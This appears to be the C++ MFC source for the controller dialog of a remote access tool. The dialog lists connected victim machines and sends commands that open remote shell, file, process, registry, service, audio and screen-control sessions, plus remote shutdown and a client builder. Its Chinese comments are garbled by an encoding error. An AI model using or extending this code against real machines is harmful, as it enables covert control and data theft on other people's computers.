
// ServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "DlgServerSet.h"
#include"DlgRemoteMessage.h"
#include"DlgCmdManager.h"
#include"DlgCreateClient.h"
#include"DlgProcessManager.h"
#include"DlgWindowManager.h"
#include"DlgRemoteControl.h"
#include"DlgFileManager.h"
#include"DlgAudioManager.h"
#include"DlgServiceManager.h"
#include"DlgRegisterManager.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

COLUMN_DATA __Column_Data_Online[]=
{
	{"IP",      150},
	{"�������/��ע",    180},
	{"����ϵͳ",         180},
	{"CPU",              150},
	{"����ͷ",           100},
	{"Ping",             110}
};
COLUMN_DATA __Column_Data_Message[] =
{
	{ "��Ϣ����",         200 },
	{ "ʱ��",             200 },
	{ "��Ϣ����",         450 }
};
UINT __Indicators[] =
{
	IDR_STATUSBAR_SERVER_STRING
};
#define  UM_BUTTON_CMD_MANAGER  WM_USER+0x10
#define  UM_NOTIFY_ICON_DATA    WM_USER+0x20

//���������ļ���ȫ�ֶ���
CConfigFile   __ConfigFile;
//����ͨ�������ȫ��ָ��
_CIOCPServer*  __IOCPServer = NULL;
//���崰�����ȫ��ָ��
CServerDlg*  __ServerDlg = NULL;

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CServerDlg �Ի���



CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_Bitmap[0].LoadBitmap(IDB_BITMAP_FINDER);
	__ServerDlg = this;
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_ONLINE, m_CListCtrl_Server_Dialog_Online);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_MESSAGE, m_CListCtrl_Server_Dialog_Message);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_COMMAND(ID_MENU_SERVER_DIALOG_SET, &CServerDlg::OnMenuServerDialogSet)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_EXIT, &CServerDlg::OnMenuServerDialogExit)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ADD, &CServerDlg::OnMenuServerDialogAdd)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER_DIALOG_ONLINE, &CServerDlg::OnNMRClickListServerDialogOnline)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION, &CServerDlg::OnMenuListServerDialogOnlineDisconnection)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_MESSAGE, &CServerDlg::OnMenuListServerDialogOnlineMessage)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_SHUTDOWN, &CServerDlg::OnMenuListServerDialogOnlineShutdown)
	
	ON_COMMAND(IDM_TOOLBAR_SERVER_CMD_MAMAGER, &CServerDlg::OnOpenCmdManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_PROCESS_MAMAGER, &CServerDlg::OnOpenProcessManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_WINDOW_MAMAGER, &CServerDlg::OnOpenWindowManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_REMOTE_CONTROLL_MAMAGER, &CServerDlg::OnOpenRemoteControl)
	ON_COMMAND(IDM_TOOLBAR_SERVER_FILE_MAMAGER, &CServerDlg::OnOpenFileManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_AUDIO_MAMAGER, &CServerDlg::OnOpenAudioManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_CLEAN_MAMAGER, &CServerDlg::OnOpenCleanManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_VIDEO_MAMAGER, &CServerDlg::OnOpenVideoManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_SERVICE_MAMAGER, &CServerDlg::OnOpenServiceManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_REGISTER_MAMAGER, &CServerDlg::OnOpenRegisterManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_SERVER_MAMAGER, &CServerDlg::OnOpenServerManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_CREATE_CLIENT, &CServerDlg::OnOpenCreateClient)
	ON_COMMAND(IDM_TOOLBAR_SERVER_ABOUT, &CServerDlg::OnOpenServerAbout)

	
	ON_WM_SIZE()
	
	ON_WM_CLOSE()
	/**************************************************************/
	/*     ������Ϣ                                               */
	/**************************************************************/
	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnNotifyIconData)
	ON_COMMAND(ID_NOTIFYICONDATA_SHOW, &CServerDlg::OnNotifyicondataShow)
	ON_COMMAND(ID_NOTIFYICONDATA_EXIT, &CServerDlg::OnNotifyicondataExit)
	ON_WM_TIMER()

	/**************************************************************/
	/*     �Զ�����Ϣ                                             */
	/**************************************************************/
	//�û�����
	ON_MESSAGE(UM_CLIENT_LOGIN,OnClientLogin)
	//Զ����Ϣ
	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnRemoteMessageManager)
	//CMD����
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)
	//���̹���
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnProcessManager)
	//���ڹ���
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)
	//Զ�̿���	
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROL_DIALOG, OnRemoteControlDialog)
	//�ļ�����
	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)
	//��Ƶ����
	ON_MESSAGE(UM_OPEN_AUDIO_MANAGER_DIALOG, OnOpenAudioManagerDialog)
	//��Ƶ����
//	ON_MESSAGE(UM_OPEN_VIDEO_MANAGER_DIALOG, OnOpenVideoManagerDialog)
	//�������
	ON_MESSAGE(UM_OPEN_SERVICE_MANAGER_DIALOG, OnOpenServiceManagerDialog)
	//ע������
	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)
END_MESSAGE_MAP()


// CServerDlg ��Ϣ�������

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	InitTrueToolBar();
	InitListControl();
	InitSolidMenu();
	InitStatusBar();
	InitNotifyIconData();
	SetTimer(1, 100, NULL);                                                     //����100����ˢ��һ�Σ���ʱ����
	m_ListenPort = __ConfigFile.GetInt("Settings", "ListenPort");              //��ȡini�ļ��еļ����˿�
	m_MaxConnection = __ConfigFile.GetInt("Settings", "MaxConnection");        //��ȡini�ļ��е����������
	ServerStart();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
//��ʼ���ؼ�
VOID CServerDlg::InitListControl()
{
	for (int i = 0; i < sizeof(__Column_Data_Online) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Online.InsertColumn(i, __Column_Data_Online[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Online[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < sizeof(__Column_Data_Message) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Message.InsertColumn(i, __Column_Data_Message[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Message[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}
//��ʼ����̬�˵�
VOID CServerDlg::InitSolidMenu()
{
	HMENU  Menu;
	Menu = LoadMenu(NULL, MAKEINTRESOURCE(IDC_MENU_SERVER_DIALOG_MAIN));
	::SetMenu(this->GetSafeHwnd(), Menu);
	::DrawMenuBar(this->GetSafeHwnd());

}

//���Ի�������
void CServerDlg::OnMenuServerDialogSet()
{
	// ����һ���Ի���
	CDlgServerSet  Dialog;
	Dialog.DoModal();
}

//���Ի����˳�
void CServerDlg::OnMenuServerDialogExit()
{
	// TODO: �ڴ���������������
	SendMessage(WM_CLOSE);
}

//���Ի������
void CServerDlg::OnMenuServerDialogAdd()
{
	// TODO: �ڴ���������������
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), "����");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, "19");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, "���佫��");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, "��");
}


void CServerDlg::OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	//Online�ؼ��б�����Ҽ������Ϣ
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	CMenu   Menu;
	//���ز˵���Դ
	Menu.LoadMenu(IDR_LIST_SERVER_DIALOG_ONLINE_MENU); 
	CMenu*  SubMenu = Menu.GetSubMenu(0);
	//������λ��
	CPoint  Point;
	GetCursorPos(&Point);

	//��ò˵�������ĸ���
	int  count = SubMenu->GetMenuItemCount();

/*
   //����ѡ�У��˵���ڣ����õ��ǲ˵������֣�
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount() == 0)
	{
		for (int i = 0; i < count; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
*/

	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_MESSAGE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_SHUTDOWN, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);

	//�����λ����ʾ�˵�
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount() != 0)
	{
		SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	}
	*pResult = 0;

}
void CServerDlg::SendingSelectedCommand(PBYTE  BufferData, ULONG BufferLength)
{
	//��ListCtrl�ϵ���������ѡ��Context
	POSITION  Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	while (Position)
	{
		int  i = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		//��ø��ŵ�����������
		CONTEXT_OBJECT*  ContextObject = (CONTEXT_OBJECT*)m_CListCtrl_Server_Dialog_Online.GetItemData(i);
		__IOCPServer->OnPreSending(ContextObject, BufferData, BufferLength);
	}
}
//OnlineList�˵���Ϣ(ɾ������)
void CServerDlg::OnMenuListServerDialogOnlineDisconnection()
{
	// TODO: �ڴ���������������
	BYTE IsToken = CLIENT_GET_OUT_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

	//���ListCtrl�б�
	CString  ClientAddress;
	int   SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	for (int i = 0; i < SelectedCount; i++)
	{
		POSITION   Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int   Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "ǿ�ƶϿ�";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}

//OnlineList�˵���Ϣ(��ʱ��Ϣ)
void CServerDlg::OnMenuListServerDialogOnlineMessage()
{
	// TODO: �ڴ���������������
	BYTE  IsToken = CLIENT_REMOTE_MESSAGE_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

}
//Զ����Ϣ
LRESULT  CServerDlg::OnRemoteMessageManager(WPARAM wParam, LPARAM lParam)
{
	//����һ��Զ����Ϣ�Ի���
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRemoteMessage*  DlgRemoteMessage = new CDlgRemoteMessage(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgRemoteMessage->Create(IDD_DIALIG_REMOTE_MESSAGE, GetDesktopWindow());
	DlgRemoteMessage->ShowWindow(SW_SHOW);
	return 0;
}

//OnlineList�˵���Ϣ(Զ�̹ػ�)
void CServerDlg::OnMenuListServerDialogOnlineShutdown()
{
	// TODO: �ڴ���������������
	BYTE  IsToken = CLIENT_SHUT_DOWN_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	
	CString  ClientAddress;
	int  SelectCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectCount; i++)
	{
		POSITION   Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int   Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "ǿ�ƶϿ�";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}
void CServerDlg::ShowDialogMessage(BOOL IsOk, CString  Message)
{
	CString  v1;
	CString  v2;
	CString  v3;
	CTime  Time = CTime::GetCurrentTime();
	v2 = Time.Format("%H:%M:%S");
	if (IsOk)
	{
		v1 = L"ִ�гɹ�";
	}
	else
	{
		v1 = L"ִ��ʧ��";
	}
	m_CListCtrl_Server_Dialog_Message.InsertItem(0, v1);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 1, v2);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 2, Message);
	if (Message.Find("����") > 0)
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("����") > 0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("�Ͽ�") > 0)
	{
		m_ConnectionCount--;
	}
	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);
	v3.Format("��%d����������", m_ConnectionCount);
	m_StatusBar.SetPaneText(0, v3);   //��״̬������ʾ����
}
void CServerDlg::InitStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators, sizeof(__Indicators) / sizeof(UINT)))
	{
		return;
	}
	CRect  v1;
	GetWindowRect(&v1);
	v1.bottom += 1;
	MoveWindow(v1);
}
void CServerDlg::InitTrueToolBar()
{
	if (!m_TrueToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_TrueToolBar.LoadToolBar(IDR_TOOLBAR_SERVER_MAIN))
	{
		return ;      // fail to create
	}
	m_TrueToolBar.LoadTrueColorToolBar(
		48,    //������ʹ�����    
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN);
	RECT   v1, v2;
	GetWindowRect(&v2);
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right - v2.left + 10;
	m_TrueToolBar.MoveWindow(&v1, TRUE);

	m_TrueToolBar.SetButtonText(0, "�ն˹���");
	m_TrueToolBar.SetButtonText(1, "���̹���");
	m_TrueToolBar.SetButtonText(2, "���ڹ���");
	m_TrueToolBar.SetButtonText(3, "�������");
	m_TrueToolBar.SetButtonText(4, "�ļ�����");
	m_TrueToolBar.SetButtonText(5, "��������");
	m_TrueToolBar.SetButtonText(6, "ϵͳ����");
	m_TrueToolBar.SetButtonText(7, "��Ƶ����");
	m_TrueToolBar.SetButtonText(8, "�������");
	m_TrueToolBar.SetButtonText(9, "ע������");
	m_TrueToolBar.SetButtonText(10, "���������");
	m_TrueToolBar.SetButtonText(11, "�ͻ��˹���");
	m_TrueToolBar.SetButtonText(12, "����");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);   //��ʾ
}
void CServerDlg::InitNotifyIconData()
{
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
	m_NotifyIconData.hWnd = m_hWnd;
	m_NotifyIconData.uID = IDR_MAINFRAME;
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;
	m_NotifyIconData.hIcon = m_hIcon;
	CString  v1 = "������ѧ��ȫʵ����";
	lstrcpyn(m_NotifyIconData.szTip, v1, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);
}
void CServerDlg::OnNotifyIconData(WPARAM wPARAM, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())
		{
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}
	case  WM_RBUTTONDOWN:
	{
		CMenu  Menu;
		Menu.LoadMenu(IDR_MENU_NOTIFY_ICON_DATA);
		CPoint  Point;
		GetCursorPos(&Point);
		//	SetForegroundWindow();    //���õ�ǰ����
		Menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON, Point.x, Point.y, this, NULL);
		//	PostMessage(WM_USER, 0, 0);
		break;
	}
	}
}
void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	if (m_StatusBar.m_hWnd != NULL)                  //״̬��
	{
		CRect  Rect;
		Rect.top = cy - 20;
		Rect.right = cx;
		Rect.left = 0;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
	}
	if (m_TrueToolBar.m_hWnd != NULL)                //������
	{
		CRect  Rect;
		Rect.top = Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = 80;
		m_TrueToolBar.MoveWindow(Rect);
	}
}
//CMD����
void CServerDlg::OnOpenCmdManager()
{
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	if (Position)
	{
		BYTE  IsToken = CLIENT_CMD_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));
	}
	return;
}
LRESULT CServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam)
{
	//����һ��Զ����Ϣ�Ի���
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgCmdManager*  DlgCmdManager = new CDlgCmdManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgCmdManager->Create(IDD_DIALOG_CMD_MANAGER, GetDesktopWindow());
	DlgCmdManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = CMD_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgCmdManager;
	return 0;
}

//���̹���
void CServerDlg::OnOpenProcessManager()
{
	BYTE  IsToken = CLIENT_PROCESS_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
}
LRESULT  CServerDlg::OnProcessManager(WPARAM wParam, LPARAM lParam)
{
	//����һ��Զ����Ϣ�Ի���
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgProcessManager*  DlgProcessManager = new CDlgProcessManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgProcessManager->Create(IDD_DIALOG_PROCESS_MANAGER, GetDesktopWindow());
	DlgProcessManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = PROCESS_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgProcessManager;
	return 0;
}
//���ڹ���
void CServerDlg::OnOpenWindowManager()
{
	BYTE  IsToken = CLIENT_WINDOW_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam)
{
	//����һ��Զ����Ϣ�Ի���
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgWindowManager*  DlgWindowManager = new CDlgWindowManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgWindowManager->Create(IDD_DIALOG_WINDOW_MANAGER, GetDesktopWindow());
	DlgWindowManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = WINDOW_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgWindowManager;
	return 0;
}
//Զ�̿���
void CServerDlg::OnOpenRemoteControl()
{
	BYTE  IsToken = CLIENT_REMOTE_CONTROL_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnRemoteControlDialog(WPARAM wParam, LPARAM lParam)
{
	//����һ��Զ����Ϣ�Ի���
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRemoteControl*  DlgRemoteControl = new CDlgRemoteControl(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgRemoteControl->Create(IDD_DIALOG_REMOTE_CONTROL, GetDesktopWindow());
	DlgRemoteControl->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REMOTE_CONTROL_DIALOG;
	ContextObject->DialogHandle = DlgRemoteControl;
	return 0;
}
//�ļ�����
void CServerDlg::OnOpenFileManager()
{
	BYTE  IsToken = CLIENT_FILE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgFileManager*  DlgFileManager = new CDlgFileManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgFileManager->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());
	DlgFileManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = FILE_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgFileManager;
	return 0;
}
//��������
void CServerDlg::OnOpenAudioManager()
{
	BYTE  IsToken = CLIENT_AUDIO_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgAudioManager*  DlgAudioManager = new CDlgAudioManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgAudioManager->Create(IDD_DIALOG_AUDIO_MANAGER, GetDesktopWindow());
	DlgAudioManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = AUDIO_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgAudioManager;
	return 0;
}
void CServerDlg::OnOpenCleanManager()
{
	MessageBox("OnOpenCleanManager", "OnOpenCleanManager");
	return;
}
void CServerDlg::OnOpenVideoManager()
{
	MessageBox("OnOpenVideoManager", "OnOpenVideoManager");
	return;
}
//�������
void CServerDlg::OnOpenServiceManager()
{
	BYTE  IsToken = CLIENT_SERVICE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgServiceManager*  DlgServiceManager = new CDlgServiceManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgServiceManager->Create(IDD_DIALOG_SERVICE_MANAGER, GetDesktopWindow());
	DlgServiceManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = SERVICE_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgServiceManager;
	return 0;
}
//ע������
void CServerDlg::OnOpenRegisterManager()
{
	BYTE  IsToken = CLIENT_REGISTER_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRegisterManager*  DlgRegisterManager = new CDlgRegisterManager(this, __IOCPServer, ContextObject);
	//���ø�����Ϊ����
	DlgRegisterManager->Create(IDD_DIALOG_REGISTER_MANAGER, GetDesktopWindow());
	DlgRegisterManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REGISTER_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgRegisterManager;
	return 0;
}
void CServerDlg::OnOpenServerManager()
{
	MessageBox("OnOpenServerManager", "OnOpenServerManager");
	return;
}
//�ͻ�������
void CServerDlg::OnOpenCreateClient()
{
	CDlgCreateClient  Dialog;
	Dialog.DoModal();
	return;
}
void CServerDlg::OnOpenServerAbout()
{
	MessageBox("OnOpenServerAbout", "OnOpenServerAbout");
	return;
}

void CServerDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
//	if (::MessageBox(NULL, "��ȷ����", "Remote", MB_OKCANCEL) == IDOK)
//	{
		Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);
		//����ͨ������������
		if (__IOCPServer != NULL)
		{
			delete  __IOCPServer;
			__IOCPServer = NULL;
		}
		CDialogEx::OnClose();
//	}
	

}


void CServerDlg::OnNotifyicondataShow()
{
	// TODO: �ڴ���������������
}


void CServerDlg::OnNotifyicondataExit()
{
	// TODO: �ڴ���������������
	CDialogEx::OnClose();
}
void CServerDlg::ServerStart()
{
	__IOCPServer = new _CIOCPServer;         //��̬���������
	if (__IOCPServer == NULL)
	{
		return;
	}
	if (__IOCPServer->ServerRun(m_ListenPort, WindowNotifyProcedure) == TRUE)
	{

	}
	//���ڽ�������ʾͨ��������Ѿ�����
	CString   v1;
	v1.Format("�����˿ڣ�%d�ɹ�",m_ListenPort);
	ShowDialogMessage(TRUE, v1);
	return;
}
